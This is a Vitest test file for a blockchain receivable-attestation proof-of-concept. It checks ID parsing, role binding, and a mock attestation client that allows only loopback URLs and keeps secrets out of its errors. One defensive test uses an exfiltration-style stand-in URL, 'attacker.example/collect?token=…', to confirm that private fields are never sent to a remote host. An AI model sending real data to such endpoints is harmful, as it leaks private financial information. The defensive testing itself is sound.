// This file is part of the GASOK Midnight local proof-of-concept.
// SPDX-License-Identifier: Apache-2.0

import { afterEach, describe, expect, it, vi } from 'vitest';
import * as api from '../api';
import {
  bigintToFixedBytes,
  bytesToHex,
  getDefaultGiwaDeploymentConfig,
  parseSubjectRole,
  parseUnsignedDecimal,
  receivableIdToBytes,
  subjectRoleToCode,
  UINT256_MAX,
} from '../giwa';
import {
  createAuthorizationChallengeRequest,
  type AuthorizationProof,
} from '../authorization';

const midnightContractAddress = '11'.repeat(32);
const partyWallet = `0x${'22'.repeat(20)}`;

function validAttestationResponse() {
  return {
    signature: {
      announcement: { x: '1', y: '2' },
      response: '3',
    },
    providerId: 2,
    policyVersion: 1,
    midnightContractAddress,
    binding: {
      giwaChainId: '91342',
      receivableFinanceAddress: '0x0f264334f98ba0d22f7fc6bb901a5fa36158a315',
      onchainReceivableId: '42',
      subjectRole: 'SELLER',
      partyWallet,
    },
    attestationType: 'mock',
    authorizationProtocol: 'eip712-role-wallet-v1',
  };
}

const expectedAttestationContext = {
  midnightContractAddress,
  onchainReceivableId: 42n,
  subjectRole: 'SELLER' as const,
  giwa: getDefaultGiwaDeploymentConfig(),
};

const authorizationRequest = createAuthorizationChallengeRequest(
  500_000_000n,
  20_000n,
  1n,
  123n,
  expectedAttestationContext,
  `0x${'aa'.repeat(32)}`,
);

const authorizationProof: AuthorizationProof = {
  version: 1,
  authorizationId: `0x${'bb'.repeat(32)}`,
  typedDataHash: `0x${'cc'.repeat(32)}`,
  signer: partyWallet,
  signature: `0x${'dd'.repeat(65)}`,
};

function fetchTestAttestation(attestationApiUrl: string) {
  return api.fetchAttestation(
    attestationApiUrl,
    authorizationRequest,
    authorizationProof,
    expectedAttestationContext,
  );
}

afterEach(() => {
  vi.restoreAllMocks();
});

describe('GIWA CLI binding helpers', () => {
  it('parses uint256 receivable IDs and encodes them as 32-byte big-endian values', () => {
    expect(parseUnsignedDecimal(UINT256_MAX.toString(), 'Receivable ID', UINT256_MAX)).toBe(UINT256_MAX);
    expect(bytesToHex(bigintToFixedBytes(0x1234n, 32, 'Receivable ID'))).toBe(`0x${'00'.repeat(30)}1234`);
    expect(bytesToHex(receivableIdToBytes(1n))).toBe(`0x${'00'.repeat(31)}01`);
  });

  it('rejects zero, signed, non-canonical, and overflowing receivable IDs', () => {
    expect(() => parseUnsignedDecimal('0', 'Receivable ID', UINT256_MAX, { positive: true })).toThrow(
      'greater than zero',
    );
    expect(() => parseUnsignedDecimal('-1', 'Receivable ID', UINT256_MAX)).toThrow('unsigned decimal');
    expect(() => parseUnsignedDecimal('01', 'Receivable ID', UINT256_MAX)).toThrow('unsigned decimal');
    expect(() => parseUnsignedDecimal((UINT256_MAX + 1n).toString(), 'Receivable ID', UINT256_MAX)).toThrow(
      'supported range',
    );
  });

  it('maps only SELLER and BUYER to the Compact role codes', () => {
    expect(subjectRoleToCode(parseSubjectRole('1'))).toBe(1n);
    expect(subjectRoleToCode(parseSubjectRole('buyer'))).toBe(2n);
    expect(() => parseSubjectRole('funder')).toThrow('SELLER');
  });

  it('derives different opaque lookup keys for different receivables and roles', () => {
    const giwa = getDefaultGiwaDeploymentConfig();
    const companyCommitment = api.deriveCompanyCommitment(Uint8Array.from({ length: 32 }, (_, index) => index), 1234n);
    const deploymentHash = api.deriveMidnightDeploymentHash(midnightContractAddress);
    const sellerSubject = {
      receivableId: receivableIdToBytes(42n),
      subjectRole: 1n,
      partyWallet: bigintToFixedBytes(0x22n, 20, 'Party wallet'),
    };
    const buyerSubject = { ...sellerSubject, subjectRole: 2n };
    const anotherReceivable = { ...sellerSubject, receivableId: receivableIdToBytes(43n) };

    const sellerKey = api.deriveReceivableEligibilityKey(
      companyCommitment,
      api.deriveGiwaReceivableBindingHash(giwa, sellerSubject),
      deploymentHash,
    );
    const buyerKey = api.deriveReceivableEligibilityKey(
      companyCommitment,
      api.deriveGiwaReceivableBindingHash(giwa, buyerSubject),
      deploymentHash,
    );
    const anotherReceivableKey = api.deriveReceivableEligibilityKey(
      companyCommitment,
      api.deriveGiwaReceivableBindingHash(giwa, anotherReceivable),
      deploymentHash,
    );

    expect(bytesToHex(sellerKey)).not.toBe(bytesToHex(buyerKey));
    expect(bytesToHex(sellerKey)).not.toBe(bytesToHex(anotherReceivableKey));
  });

  it('accepts a canonical mock response bound to the requested context', () => {
    const parsed = api.parseAttestationResponse(validAttestationResponse(), {
      ...expectedAttestationContext,
      partyWallet,
    });

    expect(parsed.providerId).toBe(2n);
    expect(parsed.binding.onchainReceivableId).toBe(42n);
    expect(parsed.binding.partyWallet).toBe(partyWallet);
  });

  it('requests one context-bound attestation and consumes the provider ID from that response', async () => {
    const fetchMock = vi
      .spyOn(globalThis, 'fetch')
      .mockResolvedValue(new Response(JSON.stringify(validAttestationResponse()), { status: 200 }));

    try {
      const attestation = await api.fetchAttestation(
        'http://localhost:4000',
        authorizationRequest,
        authorizationProof,
        expectedAttestationContext,
      );

      expect(fetchMock).toHaveBeenCalledOnce();
      const [endpoint, request] = fetchMock.mock.calls[0];
      expect(String(endpoint)).toBe('http://localhost:4000/attest');
      expect(request?.redirect).toBe('error');
      expect(request?.signal).toBeInstanceOf(AbortSignal);
      expect(JSON.parse(String(request?.body))).toEqual({
        version: 1,
        annualRevenueKrw: '500000000',
        debtRatioBps: '20000',
        overdueCount: '1',
        companyCommitmentHash: '123',
        authorizationSalt: `0x${'aa'.repeat(32)}`,
        midnightContractAddress,
        onchainReceivableId: '42',
        subjectRole: 'SELLER',
        authorization: authorizationProof,
      });
      expect(attestation.providerId).toBe(2n);
    } finally {
      fetchMock.mockRestore();
    }
  });

  it('rejects an attestation response for another role, chain, or deployment', () => {
    const wrongRole = validAttestationResponse();
    wrongRole.binding.subjectRole = 'BUYER';
    expect(() => api.parseAttestationResponse(wrongRole, expectedAttestationContext)).toThrow(
      'different receivable party',
    );

    const wrongChain = validAttestationResponse();
    wrongChain.binding.giwaChainId = '1';
    expect(() => api.parseAttestationResponse(wrongChain, expectedAttestationContext)).toThrow('different GIWA chain');

    const wrongDeployment = validAttestationResponse();
    wrongDeployment.midnightContractAddress = '33'.repeat(32);
    expect(() => api.parseAttestationResponse(wrongDeployment, expectedAttestationContext)).toThrow(
      'different Midnight contract',
    );
  });

  it('rejects a response for another authorized wallet, provider, or authorization protocol', () => {
    const wrongWallet = validAttestationResponse();
    wrongWallet.binding.partyWallet = `0x${'33'.repeat(20)}`;
    expect(() => api.parseAttestationResponse(wrongWallet, {
      ...expectedAttestationContext,
      partyWallet,
    })).toThrow('different authorized GIWA party wallet');

    const wrongProvider = validAttestationResponse();
    wrongProvider.providerId = 3;
    expect(() => api.parseAttestationResponse(wrongProvider, expectedAttestationContext)).toThrow(
      'unsupported providerId',
    );

    const wrongProtocol = validAttestationResponse();
    wrongProtocol.authorizationProtocol = 'none';
    expect(() => api.parseAttestationResponse(wrongProtocol, expectedAttestationContext)).toThrow(
      'unsupported wallet authorization protocol',
    );
  });

  it.each([
    ['top-level response', (value: any) => { value.extra = true; }],
    ['signature', (value: any) => { value.signature.extra = true; }],
    ['signature announcement', (value: any) => { value.signature.announcement.extra = true; }],
    ['GIWA binding', (value: any) => { value.binding.extra = true; }],
  ])('rejects an undefined extra key in the %s', (_label, mutate) => {
    const response = validAttestationResponse();
    mutate(response);
    expect(() => api.parseAttestationResponse(response, expectedAttestationContext)).toThrow('invalid');
  });

  it('accepts only root-path HTTP loopback attestation base URLs', () => {
    expect(api.resolveLocalAttestationEndpoint('http://localhost:4000').href).toBe(
      'http://localhost:4000/attest',
    );
    expect(api.resolveLocalAttestationEndpoint('http://127.0.0.1:4000/').href).toBe(
      'http://127.0.0.1:4000/attest',
    );
    expect(api.resolveLocalAttestationEndpoint('http://[::1]:4000').href).toBe('http://[::1]:4000/attest');

    const secretMarker = 'must-not-echo-this-token';
    for (const rejectedUrl of [
      'https://localhost:4000',
      'http://example.com:4000',
      'http://127.0.0.2:4000',
      'http://user:password@localhost:4000',
      'http://localhost:4000/api',
      `http://localhost:4000?token=${secretMarker}`,
      `http://localhost:4000#${secretMarker}`,
    ]) {
      let validationError: unknown;
      try {
        api.resolveLocalAttestationEndpoint(rejectedUrl);
      } catch (error) {
        validationError = error;
      }
      expect(validationError).toBeInstanceOf(Error);
      expect((validationError as Error).message).not.toContain(rejectedUrl);
      expect((validationError as Error).message).not.toContain(secretMarker);
    }
  });

  it('rejects a remote provider before sending private request fields', async () => {
    const fetchMock = vi.spyOn(globalThis, 'fetch');
    const secretMarker = 'remote-query-secret';
    const request = fetchTestAttestation(`https://attacker.example/collect?token=${secretMarker}`);

    await expect(request).rejects.toThrow('HTTP loopback base URL');
    await expect(request).rejects.not.toThrow(secretMarker);
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('does not echo an error response body', async () => {
    const secretMarker = 'private-financial-values-must-not-appear';
    vi.spyOn(globalThis, 'fetch').mockResolvedValue(new Response(secretMarker, { status: 500 }));

    const request = fetchTestAttestation('http://localhost:4000');
    await expect(request).rejects.toThrow('Mock Attestation API returned HTTP 500.');
    await expect(request).rejects.not.toThrow(secretMarker);
  });

  it('does not echo a malformed success response body', async () => {
    const secretMarker = 'private-success-body-must-not-appear';
    vi.spyOn(globalThis, 'fetch').mockResolvedValue(new Response(`{"value": ${secretMarker}}`, { status: 200 }));

    const request = fetchTestAttestation('http://localhost:4000');
    await expect(request).rejects.toThrow('Mock Attestation API returned invalid JSON.');
    await expect(request).rejects.not.toThrow(secretMarker);
  });

  it.each([200, 500])('rejects an oversized HTTP %i response before JSON parsing', async (status) => {
    const oversizedBody = 'x'.repeat(api.MAX_ATTESTATION_RESPONSE_BYTES + 1);
    vi.spyOn(globalThis, 'fetch').mockResolvedValue(new Response(oversizedBody, { status }));

    await expect(
      fetchTestAttestation('http://localhost:4000'),
    ).rejects.toThrow(`exceeds ${api.MAX_ATTESTATION_RESPONSE_BYTES} bytes`);
  });

  it('aborts a hanging attestation request after the fixed timeout without echoing the failure', async () => {
    const secretMarker = 'remote-failure-must-not-be-logged';
    const controller = new AbortController();
    const timeoutSpy = vi.spyOn(AbortSignal, 'timeout').mockReturnValue(controller.signal);
    vi.spyOn(globalThis, 'fetch').mockImplementation(
      async (_input, init) =>
        await new Promise<Response>((_resolve, reject) => {
          init?.signal?.addEventListener('abort', () => reject(new Error(secretMarker)), { once: true });
        }),
    );

    const request = fetchTestAttestation('http://localhost:4000');
    const assertion = expect(request).rejects.toThrow('Mock Attestation API request timed out.');
    controller.abort(new Error(secretMarker));

    await assertion;
    expect(timeoutSpy).toHaveBeenCalledWith(api.ATTESTATION_REQUEST_TIMEOUT_MS);
    await expect(request).rejects.not.toThrow(secretMarker);
  });

  it('keeps the fixed timeout active while a response body is hanging', async () => {
    const controller = new AbortController();
    vi.spyOn(AbortSignal, 'timeout').mockReturnValue(controller.signal);
    vi.spyOn(globalThis, 'fetch').mockResolvedValue(
      new Response(
        new ReadableStream<Uint8Array>({
          start() {
            // Intentionally never enqueue or close.
          },
        }),
        { status: 200 },
      ),
    );

    const request = fetchTestAttestation('http://localhost:4000');
    const assertion = expect(request).rejects.toThrow('Mock Attestation API request timed out.');
    await Promise.resolve();
    controller.abort();

    await assertion;
  });
});
